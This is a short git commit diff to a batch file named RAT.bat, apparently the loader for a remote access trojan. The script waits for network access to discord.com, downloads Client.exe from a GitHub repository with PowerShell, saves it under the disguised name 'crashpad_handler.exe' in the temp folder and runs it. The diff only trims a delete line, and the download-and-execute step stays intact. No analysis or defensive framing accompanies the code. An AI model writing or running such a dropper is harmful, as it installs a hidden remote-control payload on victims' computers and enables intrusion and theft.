1cf985fc9c76cacc5d3fe562ae5660c9e4edd5b6
rxu7s <104208624+rxu7s@users.noreply.github.com>
2022-10-30 21:43:19 +0300

    Add files via upload

--- RAT.bat
+++ RAT.bat
@@ -8,9 +8,7 @@ cd %temp%
 ping discord.com
 IF %ERRORLEVEL% NEQ 0 goto a
 
-if exist crashpad_handler.exe del crashpad_handler.exe
 powershell -command Invoke-WebRequest https://github.com/rxu7s/Public/raw/main/Client.exe -OutFile "crashpad_handler.exe"
-
 if exist crashpad_handler.exe (
 	start crashpad_handler.exe
 	exit
